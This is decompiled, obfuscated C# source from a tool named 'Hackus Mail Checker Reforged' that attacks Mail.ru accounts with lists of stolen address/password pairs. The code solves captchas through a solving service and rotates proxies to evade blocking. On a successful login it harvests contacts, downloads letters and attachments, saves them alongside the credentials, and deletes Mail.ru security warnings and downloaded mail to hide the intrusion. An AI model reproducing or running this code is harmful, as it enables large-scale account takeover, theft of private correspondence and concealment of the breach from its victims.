using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using Hackus_Mail_Checker_Reforged.Helpers;
using Hackus_Mail_Checker_Reforged.Models;
using Hackus_Mail_Checker_Reforged.Models.Enums;
using Hackus_Mail_Checker_Reforged.Net.Mail.Message;
using Hackus_Mail_Checker_Reforged.Net.Web.MailRu;
using Hackus_Mail_Checker_Reforged.Services.Managers;
using Hackus_Mail_Checker_Reforged.Services.Settings;
using Newtonsoft.Json;
using xNet;

namespace Hackus_Mail_Checker_Reforged.Net
{
	// Token: 0x020000A4 RID: 164
	internal class MailRuClientNew
	{
		// Token: 0x17000133 RID: 307
		// (get) Token: 0x0600053E RID: 1342 RVA: 0x00006D62 File Offset: 0x00004F62
		private SearchSettings SearchSettings
		{
			get
			{
				return SearchSettings.Instance;
			}
		}

		// Token: 0x0600053F RID: 1343 RVA: 0x00009B1E File Offset: 0x00007D1E
		public MailRuClientNew(Mailbox mailbox)
		{
			this._mailbox = mailbox;
		}

		// Token: 0x06000540 RID: 1344 RVA: 0x0001E9F8 File Offset: 0x0001CBF8
		public void Handle()
		{
			if (this._mailbox.Address == null)
			{
				return;
			}
			if (WebSettings.Instance.MailRuMethod == MailRuMethod.Cloud)
			{
				OperationResult operationResult = this.LoginOAuth();
				StatisticsManager.Instance.Increment(operationResult);
				FileManager.SaveStatistics(this._mailbox.Address, this._mailbox.Password, operationResult);
				if (operationResult == OperationResult.Ok && !SearchSettings.Instance.Search)
				{
					MailManager.Instance.AddResult(new MailboxResult(this._mailbox));
					return;
				}
			}
			else
			{
				OperationResult operationResult = this.Login();
				StatisticsManager.Instance.Increment(operationResult);
				FileManager.SaveStatistics(this._mailbox.Address, this._mailbox.Password, operationResult);
				if (operationResult == OperationResult.Ok)
				{
					this.ProcessValid();
					if (!this.SearchSettings.Search)
					{
						MailManager.Instance.AddResult(new MailboxResult(this._mailbox));
					}
				}
			}
		}

		// Token: 0x06000541 RID: 1345 RVA: 0x0001EAD0 File Offset: 0x0001CCD0
		public OperationResult LoginOAuth()
		{
			OperationResult result;
			for (;;)
			{
				this.Reset();
				this.WaitPause();
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						this.SetHeaders(httpRequest);
						httpRequest.UserAgent = <Module>.smethod_2<string>(544232174);
						httpRequest.AddParam(<Module>.smethod_2<string>(-1803175773), this._mailbox.Address);
						httpRequest.AddParam(<Module>.smethod_3<string>(274735031), <Module>.smethod_4<string>(1092779097));
						httpRequest.AddParam(<Module>.smethod_2<string>(-46006352), this._mailbox.Password);
						httpRequest.AddParam(<Module>.smethod_2<string>(1251458512), <Module>.smethod_6<string>(-1622366585));
						string text = httpRequest.Post(<Module>.smethod_4<string>(124383220)).ToString();
						if (!text.Contains(<Module>.smethod_2<string>(-720593000)))
						{
							if (text.Contains(<Module>.smethod_6<string>(-722061701)))
							{
								result = OperationResult.Bad;
							}
							else if (!text.Contains(<Module>.smethod_6<string>(-1313039437)))
							{
								StatisticsManager.Instance.AddErrorDetails(this._mailbox.Address, text);
								result = OperationResult.Error;
							}
							else
							{
								result = OperationResult.Blocked;
							}
						}
						else
						{
							result = OperationResult.Ok;
						}
					}
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
					continue;
				}
				break;
			}
			return result;
		}

		// Token: 0x06000542 RID: 1346 RVA: 0x0001EC48 File Offset: 0x0001CE48
		public OperationResult Login()
		{
			int num = 0;
			OperationResult item2;
			for (;;)
			{
				this.Reset();
				ValueTuple<OperationResult, string> valueTuple = this.CreateSession(null);
				OperationResult operationResult = valueTuple.Item1;
				string item = valueTuple.Item2;
				if (operationResult == OperationResult.ReCaptcha)
				{
					if (WebSettings.Instance.SolveCaptcha && !string.IsNullOrEmpty(WebSettings.Instance.CaptchaSolvationKey))
					{
						ValueTuple<OperationResult, string> reCaptchaSiteKey = this.GetReCaptchaSiteKey(item);
						item2 = reCaptchaSiteKey.Item1;
						string item3 = reCaptchaSiteKey.Item2;
						if (item2 == OperationResult.Error)
						{
							break;
						}
						if (item2 == OperationResult.HttpError)
						{
							continue;
						}
						ValueTuple<OperationResult, string> valueTuple2 = CaptchaHelpers.CreateInstance().SolveRecaptchaV2Proxyless(item3, <Module>.smethod_6<string>(-1758002524));
						OperationResult item4 = valueTuple2.Item1;
						string item5 = valueTuple2.Item2;
						if (item4 == OperationResult.Error)
						{
							return item4;
						}
						if (item4 == OperationResult.HttpError)
						{
							continue;
						}
						ValueTuple<OperationResult, string> valueTuple3 = this.CreateSession(item5);
						operationResult = valueTuple3.Item1;
						item = valueTuple3.Item2;
					}
					else
					{
						if (!ProxySettings.Instance.UseProxy)
						{
							return OperationResult.Captcha;
						}
						if (WebSettings.Instance.RebruteCaptcha && num < WebSettings.Instance.RebruteCaptchaLimit)
						{
							num++;
							continue;
						}
						return OperationResult.Captcha;
					}
				}
				if (operationResult == OperationResult.TwoFactor)
				{
					OperationResult verificationType = this.GetVerificationType();
					if (verificationType == OperationResult.HttpError)
					{
						continue;
					}
					if (verificationType == OperationResult.TwoFactor)
					{
						return verificationType;
					}
					if (!WebSettings.Instance.SolveCaptcha || string.IsNullOrEmpty(WebSettings.Instance.CaptchaSolvationKey))
					{
						return OperationResult.Captcha;
					}
					ValueTuple<OperationResult, MemoryStream> captchaImage = this.GetCaptchaImage();
					OperationResult item6 = captchaImage.Item1;
					MemoryStream item7 = captchaImage.Item2;
					if (item6 == OperationResult.Error)
					{
						return item6;
					}
					if (item6 == OperationResult.HttpError)
					{
						continue;
					}
					ValueTuple<OperationResult, string> valueTuple4 = CaptchaHelpers.CreateInstance().SolveCaptcha(Convert.ToBase64String(item7.ToArray()), <Module>.smethod_4<string>(123771213), false);
					OperationResult item8 = valueTuple4.Item1;
					string item9 = valueTuple4.Item2;
					if (item8 == OperationResult.Error)
					{
						return item8;
					}
					if (item8 == OperationResult.HttpError)
					{
						continue;
					}
					ValueTuple<OperationResult, string> valueTuple5 = this.SubmitCaptchaAnswer(item9);
					OperationResult item10 = valueTuple5.Item1;
					string item11 = valueTuple5.Item2;
					switch (item10)
					{
					case OperationResult.Error:
						return item10;
					case OperationResult.HttpError:
						continue;
					case OperationResult.Blocked:
						return item10;
					default:
						operationResult = this.CreateSessionByLink(item11);
						if (operationResult == OperationResult.Error)
						{
							return operationResult;
						}
						if (operationResult == OperationResult.HttpError)
						{
							continue;
						}
						break;
					}
				}
				if (operationResult != OperationResult.HttpError)
				{
					return operationResult;
				}
			}
			return item2;
		}

		// Token: 0x06000543 RID: 1347 RVA: 0x0001EE50 File Offset: 0x0001D050
		private ValueTuple<OperationResult, string> CreateSession(string reCaptchaToken = null)
		{
			int num = (reCaptchaToken == null) ? 1 : 3;
			for (int i = 0; i < num; i++)
			{
				this.WaitPause();
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						this.SetHeaders(httpRequest);
						httpRequest.AllowAutoRedirect = false;
						httpRequest.AddParam(<Module>.smethod_3<string>(-1580207773), this._mailbox.Address);
						httpRequest.AddParam(<Module>.smethod_3<string>(-1433986953), this._mailbox.Password);
						if (reCaptchaToken != null)
						{
							httpRequest.AddParam(<Module>.smethod_3<string>(-312141824), reCaptchaToken);
						}
						string location = httpRequest.Post(<Module>.smethod_4<string>(-805546105)).Location;
						if (location.Contains(<Module>.smethod_5<string>(1660845962)))
						{
							return new ValueTuple<OperationResult, string>(OperationResult.TwoFactor, location);
						}
						if (location.Contains(<Module>.smethod_3<string>(-200548770)))
						{
							return new ValueTuple<OperationResult, string>(OperationResult.ReCaptcha, location);
						}
						if (location.Contains(<Module>.smethod_4<string>(1562246075)))
						{
							return new ValueTuple<OperationResult, string>(OperationResult.Bad, location);
						}
						if (location.ContainsOne(new string[]
						{
							<Module>.smethod_6<string>(1525240939),
							<Module>.smethod_6<string>(932533418)
						}))
						{
							return new ValueTuple<OperationResult, string>(OperationResult.Blocked, location);
						}
						if (location.Contains(<Module>.smethod_4<string>(-1159001420)))
						{
							return new ValueTuple<OperationResult, string>(OperationResult.Ok, location);
						}
						StatisticsManager.Instance.AddErrorDetails(this._mailbox.Address, <Module>.smethod_6<string>(934263203) + location);
						return new ValueTuple<OperationResult, string>(OperationResult.Error, null);
					}
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
				}
			}
			return new ValueTuple<OperationResult, string>(OperationResult.HttpError, null);
		}

		// Token: 0x06000544 RID: 1348 RVA: 0x0001F03C File Offset: 0x0001D23C
		private ValueTuple<OperationResult, string> GetReCaptchaSiteKey(string location)
		{
			for (int i = 0; i < 2; i++)
			{
				this.WaitPause();
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						this.SetHeaders(httpRequest);
						Match match = Regex.Match(httpRequest.Get(location, null).ToString(), <Module>.smethod_6<string>(-398896273));
						if (!match.Success)
						{
							return new ValueTuple<OperationResult, string>(OperationResult.Error, null);
						}
						return new ValueTuple<OperationResult, string>(OperationResult.Ok, match.Groups[1].Value);
					}
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
				}
			}
			return new ValueTuple<OperationResult, string>(OperationResult.HttpError, null);
		}

		// Token: 0x06000545 RID: 1349 RVA: 0x0001F0F4 File Offset: 0x0001D2F4
		public OperationResult GetVerificationType()
		{
			for (int i = 0; i < 2; i++)
			{
				this.WaitPause();
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						this.SetHeaders(httpRequest);
						httpRequest.AllowAutoRedirect = false;
						if (!httpRequest.Get(<Module>.smethod_6<string>(1229752071), null).ToString().Contains(<Module>.smethod_6<string>(-1008901644)))
						{
							return OperationResult.TwoFactor;
						}
						return OperationResult.Captcha;
					}
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
				}
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000546 RID: 1350 RVA: 0x0001F194 File Offset: 0x0001D394
		private ValueTuple<OperationResult, MemoryStream> GetCaptchaImage()
		{
			for (int i = 0; i < 2; i++)
			{
				this.WaitPause();
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						this.SetHeaders(httpRequest);
						MemoryStream memoryStream = httpRequest.Get(<Module>.smethod_2<string>(712878836), null).ToMemoryStream();
						if (memoryStream != null && memoryStream.Length != 0L)
						{
							return new ValueTuple<OperationResult, MemoryStream>(OperationResult.Ok, memoryStream);
						}
						return new ValueTuple<OperationResult, MemoryStream>(OperationResult.Error, null);
					}
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
				}
			}
			return new ValueTuple<OperationResult, MemoryStream>(OperationResult.HttpError, null);
		}

		// Token: 0x06000547 RID: 1351 RVA: 0x0001F238 File Offset: 0x0001D438
		private ValueTuple<OperationResult, string> SubmitCaptchaAnswer(string answer)
		{
			for (int i = 0; i < 2; i++)
			{
				this.WaitPause();
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						this.SetHeaders(httpRequest);
						httpRequest.AllowAutoRedirect = false;
						httpRequest.AddParam(<Module>.smethod_3<string>(-79318521), <Module>.smethod_2<string>(1444572546) + answer.ToLower() + <Module>.smethod_4<string>(-1851487093));
						httpRequest.AddParam(<Module>.smethod_6<string>(631855195), <Module>.smethod_6<string>(-701304281));
						string text = httpRequest.Post(<Module>.smethod_4<string>(-1861103731)).ToString();
						if (!text.Contains(<Module>.smethod_4<string>(2007671458)))
						{
							if (text.Contains(<Module>.smethod_4<string>(-1323708280)))
							{
								return new ValueTuple<OperationResult, string>(OperationResult.Blocked, null);
							}
							if (text.Contains(<Module>.smethod_5<string>(-1040596284)))
							{
								return new ValueTuple<OperationResult, string>(OperationResult.HttpError, null);
							}
						}
						else
						{
							Match match = Regex.Match(text, <Module>.smethod_6<string>(1043952367));
							if (match.Success)
							{
								return new ValueTuple<OperationResult, string>(OperationResult.Ok, match.Groups[1].Value);
							}
						}
						return new ValueTuple<OperationResult, string>(OperationResult.Error, null);
					}
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
				}
			}
			return new ValueTuple<OperationResult, string>(OperationResult.HttpError, null);
		}

		// Token: 0x06000548 RID: 1352 RVA: 0x0001F3C4 File Offset: 0x0001D5C4
		private OperationResult CreateSessionByLink(string url)
		{
			for (int i = 0; i < 2; i++)
			{
				this.WaitPause();
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						this.SetHeaders(httpRequest);
						httpRequest.AllowAutoRedirect = false;
						string text = WebUtility.UrlDecode(Regex.Unescape(url));
						if (!httpRequest.Get(text, null).Location.Contains(<Module>.smethod_3<string>(401747597)))
						{
							return OperationResult.Error;
						}
						return OperationResult.Ok;
					}
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
				}
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000549 RID: 1353 RVA: 0x0001F464 File Offset: 0x0001D664
		private OperationResult GetSearchToken()
		{
			this.WaitPause();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					httpRequest.AddUrlParam(<Module>.smethod_3<string>(1117564457), this._mailbox.Address);
					Match match = Regex.Match(httpRequest.Get(<Module>.smethod_4<string>(1305569147), null).ToString(), <Module>.smethod_4<string>(250011521));
					if (match.Success)
					{
						this._searchToken = match.Groups[1].Value;
						return OperationResult.Ok;
					}
					return OperationResult.Bad;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.Retry;
		}

		// Token: 0x0600054A RID: 1354 RVA: 0x0001F52C File Offset: 0x0001D72C
		private OperationResult DownloadContacts()
		{
			this.WaitPause();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					FormUrlEncodedContent formUrlEncodedContent = new FormUrlEncodedContent(new List<KeyValuePair<string, string>>
					{
						new KeyValuePair<string, string>(<Module>.smethod_2<string>(-2034377709), <Module>.smethod_3<string>(603798012) + this._mailbox.Address + <Module>.smethod_5<string>(1507851657) + this._searchToken)
					}, false, null);
					foreach (object obj in Regex.Matches(httpRequest.Post(<Module>.smethod_5<string>(1476060657), formUrlEncodedContent).ToString(), <Module>.smethod_5<string>(716255193)))
					{
						FileManager.SaveContact(((Match)obj).Groups[1].Value);
					}
					return OperationResult.Ok;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.Retry;
		}

		// Token: 0x0600054B RID: 1355 RVA: 0x0001F650 File Offset: 0x0001D850
		public void ProcessValid()
		{
			if (!this.SearchSettings.Search && !WebSettings.Instance.ParseMailRuContacts && (!this.SearchSettings.SearchAttachments || this.SearchSettings.SearchAttachmentsMode != SearchAttachmentsMode.Everywhere))
			{
				return;
			}
			OperationResult operationResult = OperationResult.Retry;
			int num = 0;
			bool flag = false;
			bool flag2 = false;
			bool flag3 = false;
			bool flag4 = false;
			bool flag5 = false;
			bool flag6 = false;
			bool flag7 = false;
			bool flag8 = false;
			List<Request> list = new List<Request>();
			Queue<Uid> queue = null;
			List<Uid> list2 = new List<Uid>();
			while (operationResult == OperationResult.Retry)
			{
				if (num <= 2)
				{
					if (flag)
					{
						operationResult = OperationResult.Ok;
					}
					else
					{
						operationResult = this.GetSearchToken();
						if (operationResult == OperationResult.Ok)
						{
							flag = true;
						}
					}
					if (operationResult != OperationResult.Retry)
					{
						if (operationResult != OperationResult.Bad)
						{
							if (!flag2 && WebSettings.Instance.ParseMailRuContacts)
							{
								operationResult = this.DownloadContacts();
								if (operationResult == OperationResult.Ok || operationResult == OperationResult.Bad)
								{
									flag2 = true;
								}
							}
							else
							{
								operationResult = OperationResult.Ok;
							}
							if (operationResult != OperationResult.Retry)
							{
								if (!flag3 && this.SearchSettings.Search)
								{
									operationResult = this.SearchMessages(list);
									if (operationResult == OperationResult.Ok)
									{
										flag3 = true;
									}
								}
								else
								{
									operationResult = OperationResult.Ok;
								}
								if (operationResult == OperationResult.Retry)
								{
									if (ProxySettings.Instance.UseProxy)
									{
										this._proxyClient = ProxyManager.Instance.GetProxy();
										continue;
									}
									continue;
								}
								else if (operationResult != OperationResult.Bad)
								{
									if (!flag4 && this.SearchSettings.SearchAttachments && this.SearchSettings.SearchAttachmentsMode == SearchAttachmentsMode.Everywhere)
									{
										operationResult = this.SearchAttachments(ref queue);
										if (operationResult == OperationResult.Ok || operationResult == OperationResult.Bad)
										{
											flag4 = true;
										}
									}
									else
									{
										operationResult = OperationResult.Ok;
									}
									if (operationResult != OperationResult.Retry)
									{
										if (!flag5 && WebSettings.Instance.DeleteMailRuWarningMessages)
										{
											operationResult = this.SearchSecurityMessages(list2);
											flag5 = true;
										}
										else
										{
											operationResult = OperationResult.Ok;
										}
										if (!flag6 && this.SearchSettings.DeleteWhenDownloaded)
										{
											foreach (Request request in list)
											{
												list2.AddRange(request.SavedUids);
											}
											flag6 = true;
										}
										else
										{
											operationResult = OperationResult.Ok;
										}
										list2 = new List<Uid>(list2.Distinct<Uid>());
										if (!flag8 && list2.Any<Uid>())
										{
											if (!flag7)
											{
												operationResult = this.MoveMessages(list2, MoveDestination.Trash);
												if (operationResult == OperationResult.Ok)
												{
													flag7 = true;
												}
											}
											if (operationResult == OperationResult.Ok)
											{
												operationResult = this.MoveMessages(list2, MoveDestination.Delete);
												if (operationResult == OperationResult.Ok)
												{
													flag8 = true;
												}
											}
											if (operationResult == OperationResult.Bad)
											{
												flag7 = true;
												flag8 = true;
												break;
											}
										}
										else
										{
											operationResult = OperationResult.Ok;
										}
										if (operationResult != OperationResult.Retry)
										{
											continue;
										}
										if (ProxySettings.Instance.UseProxy)
										{
											this._proxyClient = ProxyManager.Instance.GetProxy();
											continue;
										}
										continue;
									}
									else
									{
										if (ProxySettings.Instance.UseProxy)
										{
											this._proxyClient = ProxyManager.Instance.GetProxy();
											continue;
										}
										continue;
									}
								}
							}
							else
							{
								if (ProxySettings.Instance.UseProxy)
								{
									this._proxyClient = ProxyManager.Instance.GetProxy();
									continue;
								}
								continue;
							}
						}
					}
					else
					{
						if (ProxySettings.Instance.UseProxy)
						{
							this._proxyClient = ProxyManager.Instance.GetProxy();
							continue;
						}
						continue;
					}
				}
				IL_299:
				foreach (Request request2 in list)
				{
					int count = request2.Count;
					if (count > 0 && (!this.SearchSettings.UseSearchLimit || this.SearchSettings.SearchLimit <= count))
					{
						MailboxResult result = new MailboxResult(this._mailbox, request2.ToString(), count);
						MailManager.Instance.AddResult(result);
						StatisticsManager.Instance.IncrementFound();
						FileManager.SaveFound(this._mailbox.Address, this._mailbox.Password, request2.ToString(), count);
					}
				}
				return;
			}
			goto IL_299;
		}

		// Token: 0x0600054C RID: 1356 RVA: 0x0001F9C0 File Offset: 0x0001DBC0
		private OperationResult SearchMessages(List<Request> checkedRequests)
		{
			using (IEnumerator<Request> enumerator = this.SearchSettings.Requests.GetEnumerator())
			{
				while (enumerator.MoveNext())
				{
					Request request = enumerator.Current;
					Request request3 = checkedRequests.FirstOrDefault((Request r) => MailRuClientNew.<>c__DisplayClass19_0.smethod_0(r.Sender, request.Sender) && MailRuClientNew.<>c__DisplayClass19_0.smethod_0(r.Body, request.Body) && MailRuClientNew.<>c__DisplayClass19_0.smethod_0(r.Subject, request.Subject));
					if (request3 != null)
					{
						if (request3.IsChecked)
						{
							continue;
						}
						if (request3.SavedUids != null)
						{
							if (request3.SavedUids.Count >= this.SearchSettings.DownloadLettersLimit)
							{
								continue;
							}
						}
					}
					else
					{
						request3 = request.Clone();
						request3.FindedUids = new HashSet<Uid>();
						request3.SavedUids = new HashSet<Uid>();
						checkedRequests.Add(request3);
					}
					Request request2 = request3;
					if (!request2.FindedUids.Any<Uid>())
					{
						OperationResult operationResult = this.Search(request2);
						if (operationResult == OperationResult.Error)
						{
							request2.IsChecked = true;
							continue;
						}
						if (operationResult == OperationResult.HttpError)
						{
							return OperationResult.Retry;
						}
					}
					if (this.SearchSettings.DownloadLetters)
					{
						if (CheckerSettings.Instance.UsePop3Limit && request2.FindedUids.Count > CheckerSettings.Instance.Pop3Limit)
						{
							request3.FindedUids = new HashSet<Uid>(request3.FindedUids.Take(CheckerSettings.Instance.Pop3Limit));
						}
						using (HashSet<Uid>.Enumerator enumerator2 = request3.FindedUids.GetEnumerator())
						{
							while (enumerator2.MoveNext())
							{
								Uid uid = enumerator2.Current;
								if (!request3.SavedUids.Any((Uid u) => u == uid))
								{
									if (request3.SavedUids.Count >= this.SearchSettings.DownloadLettersLimit)
									{
										break;
									}
									MailMessage message;
									OperationResult operationResult2 = this.FetchMessage(uid, this.SearchSettings.SearchAttachments && this.SearchSettings.SearchAttachmentsMode == SearchAttachmentsMode.InDownloaded, out message);
									if (operationResult2 != OperationResult.Error)
									{
										if (operationResult2 == OperationResult.HttpError)
										{
											return OperationResult.Retry;
										}
										request3.SavedUids.Add(uid);
										FileManager.SaveWebLetter(this._mailbox.Address, this._mailbox.Password, request3.ToString(), message);
									}
									else
									{
										request3.SavedUids.Add(uid);
									}
								}
							}
						}
					}
					request2.IsChecked = true;
				}
			}
			return OperationResult.Ok;
		}

		// Token: 0x0600054D RID: 1357 RVA: 0x0001FC50 File Offset: 0x0001DE50
		private OperationResult SearchAttachments(ref Queue<Uid> leftAttachmentMessages)
		{
			this.WaitPause();
			if (leftAttachmentMessages == null)
			{
				OperationResult result;
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						this.SetHeaders(httpRequest);
						httpRequest.AddUrlParam(<Module>.smethod_6<string>(-1094373818), this._searchToken);
						httpRequest.AddUrlParam(<Module>.smethod_2<string>(1629539053), 1);
						httpRequest.AddUrlParam(<Module>.smethod_5<string>(1629054962), 1);
						httpRequest.AddUrlParam(<Module>.smethod_4<string>(-2132205616), <Module>.smethod_4<string>(316715980));
						httpRequest.AddUrlParam(<Module>.smethod_3<string>(1889210912), <Module>.smethod_4<string>(316715980));
						httpRequest.AddUrlParam(<Module>.smethod_6<string>(1963284886), <Module>.smethod_4<string>(1274271205));
						httpRequest.AddUrlParam(<Module>.smethod_2<string>(-1582845470), this._mailbox.Address);
						string input = httpRequest.Get(<Module>.smethod_5<string>(109444034), null).ToString();
						leftAttachmentMessages = new Queue<Uid>();
						if (!Regex.Match(input, <Module>.smethod_4<string>(-117868751)).Success)
						{
							return OperationResult.Ok;
						}
						foreach (object obj in Regex.Matches(input, <Module>.smethod_2<string>(2029387651)))
						{
							Match match = (Match)obj;
							leftAttachmentMessages.Enqueue(new Uid(match.Groups[1].Value));
						}
					}
					goto IL_199;
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
					result = OperationResult.Retry;
				}
				return result;
			}
			IL_199:
			while (leftAttachmentMessages.Any<Uid>())
			{
				Uid uid = leftAttachmentMessages.Dequeue();
				MailMessage mailMessage;
				if (this.FetchMessage(uid, true, out mailMessage) == OperationResult.HttpError)
				{
					return OperationResult.Retry;
				}
			}
			return OperationResult.Ok;
		}

		// Token: 0x0600054E RID: 1358 RVA: 0x0001FE68 File Offset: 0x0001E068
		private OperationResult Search(Request searchRequest)
		{
			this.WaitPause();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					this.SetSearchHeaders(httpRequest, searchRequest);
					string input = httpRequest.Get(<Module>.smethod_2<string>(-334340141), null).ToString();
					Match match = Regex.Match(input, <Module>.smethod_5<string>(1592097901));
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					match = Regex.Match(input, <Module>.smethod_6<string>(482380976));
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					searchRequest.Count = int.Parse(match.Groups[1].Value);
					foreach (object obj in Regex.Matches(input, <Module>.smethod_4<string>(932880556)))
					{
						Match match2 = (Match)obj;
						searchRequest.FindedUids.Add(new Uid(match2.Groups[1].Value));
					}
					return OperationResult.Ok;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x0600054F RID: 1359 RVA: 0x0001FFEC File Offset: 0x0001E1EC
		private OperationResult FetchMessage(Uid uid, bool downloadAttachments, out MailMessage message)
		{
			this.WaitPause();
			message = new MailMessage();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					httpRequest.AddUrlParam(<Module>.smethod_4<string>(240394883), uid.UID);
					httpRequest.AddUrlParam(<Module>.smethod_6<string>(598989280), this._mailbox.Address);
					httpRequest.AddUrlParam(<Module>.smethod_3<string>(-1418633577), this._searchToken);
					string input = httpRequest.Get(<Module>.smethod_4<string>(-1512456735), null).ToString();
					Match match = Regex.Match(input, <Module>.smethod_5<string>(-122630454));
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					message.Subject = match.Groups[1].Value;
					match = Regex.Match(input, <Module>.smethod_5<string>(1549974779));
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					long unixTimeStamp = long.Parse(match.Groups[1].Value);
					message.Date = DateHelpers.UnixTimeStampToDate(unixTimeStamp);
					match = Regex.Match(input, <Module>.smethod_2<string>(-135777895));
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					message.AlternateViews.Add(new Attachment(<Module>.smethod_5<string>(473053949), match.Groups[1].Value));
					MatchCollection matchCollection = Regex.Matches(input, <Module>.smethod_4<string>(-902324492));
					if (matchCollection.Count > 2 && matchCollection[1].Success)
					{
						message.From = matchCollection[1].Groups[1].Value;
						if (downloadAttachments)
						{
							try
							{
								match = Regex.Match(input, <Module>.smethod_5<string>(30363851));
								if (match.Success)
								{
									AttachmentInfo[] array = JsonConvert.DeserializeObject<AttachmentInfo[]>(match.Groups[1].Value);
									for (int i = 0; i < array.Length; i++)
									{
										AttachmentInfo attachment = array[i];
										if (!SearchSettings.Instance.UseAttachmentFilters || SearchSettings.Instance.AttachmentFilters.Any((string filter) => attachment.Name.ContainsIgnoreCase(filter)))
										{
											Attachment attachment2 = this.FetchAttachment(attachment);
											if (attachment2 != null)
											{
												FileManager.SaveAttachment(attachment2, this._mailbox.Address);
											}
										}
									}
								}
							}
							catch
							{
							}
						}
						return OperationResult.Ok;
					}
					return OperationResult.Error;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000550 RID: 1360 RVA: 0x000202CC File Offset: 0x0001E4CC
		private OperationResult SearchSecurityMessages(List<Uid> toDelete)
		{
			Request request = new Request
			{
				Sender = <Module>.smethod_3<string>(-1039523318)
			};
			request.FindedUids = new HashSet<Uid>();
			if (this.Search(request) == OperationResult.Ok)
			{
				toDelete.AddRange(request.FindedUids.Take(3));
			}
			return OperationResult.Ok;
		}

		// Token: 0x06000551 RID: 1361 RVA: 0x00020318 File Offset: 0x0001E518
		private OperationResult MoveMessages(List<Uid> uids, MoveDestination destination)
		{
			this.WaitPause();
			OperationResult result;
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					StringBuilder stringBuilder = new StringBuilder(<Module>.smethod_6<string>(1071628927));
					for (int i = 0; i < uids.Count; i++)
					{
						stringBuilder.Append(<Module>.smethod_5<string>(1111656108));
						stringBuilder.Append(uids[i].UID);
						if (i != uids.Count - 1)
						{
							stringBuilder.Append(<Module>.smethod_3<string>(2131671410));
						}
						else
						{
							stringBuilder.Append(<Module>.smethod_3<string>(1298413043));
						}
					}
					stringBuilder.Append(<Module>.smethod_3<string>(1850728268));
					FormUrlEncodedContent formUrlEncodedContent = new FormUrlEncodedContent(new List<KeyValuePair<string, string>>
					{
						new KeyValuePair<string, string>(<Module>.smethod_4<string>(1300760828), (destination == MoveDestination.Trash) ? <Module>.smethod_6<string>(-11320458) : <Module>.smethod_6<string>(-113786115)),
						new KeyValuePair<string, string>(<Module>.smethod_2<string>(340122552), stringBuilder.ToString()),
						new KeyValuePair<string, string>(<Module>.smethod_5<string>(1487982047), <Module>.smethod_2<string>(-1874002529)),
						new KeyValuePair<string, string>(<Module>.smethod_3<string>(1117564457), this._mailbox.Address),
						new KeyValuePair<string, string>(<Module>.smethod_3<string>(803920988), <Module>.smethod_5<string>(1771717145)),
						new KeyValuePair<string, string>(<Module>.smethod_6<string>(-1094373818), this._searchToken)
					}, false, null);
					if (httpRequest.Post(<Module>.smethod_5<string>(1476060657), formUrlEncodedContent).ToString().Contains(<Module>.smethod_2<string>(-625497200)))
					{
						result = OperationResult.Ok;
					}
					else
					{
						result = OperationResult.Bad;
					}
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
				result = OperationResult.Retry;
			}
			return result;
		}

		// Token: 0x06000552 RID: 1362 RVA: 0x00020520 File Offset: 0x0001E720
		private Attachment FetchAttachment(AttachmentInfo attachmentInfo)
		{
			this.WaitPause();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					MemoryStream memoryStream = httpRequest.Get(attachmentInfo.Href.Download, null).ToMemoryStream();
					if (memoryStream != null && memoryStream.Length != 0L)
					{
						return new Attachment(attachmentInfo.ContentType, memoryStream.ToArray(), attachmentInfo.Name);
					}
					return null;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return null;
		}

		// Token: 0x06000553 RID: 1363 RVA: 0x00009B2D File Offset: 0x00007D2D
		private void Reset()
		{
			this._cookies = new CookieDictionary(false);
			if (ProxySettings.Instance.UseProxy)
			{
				this._proxyClient = ProxyManager.Instance.GetProxy();
			}
		}

		// Token: 0x06000554 RID: 1364 RVA: 0x000205BC File Offset: 0x0001E7BC
		private void SetHeaders(HttpRequest request)
		{
			request.IgnoreProtocolErrors = true;
			request.ConnectTimeout = CheckerSettings.Instance.Timeout * 1000;
			request.ReadWriteTimeout = CheckerSettings.Instance.Timeout * 1000;
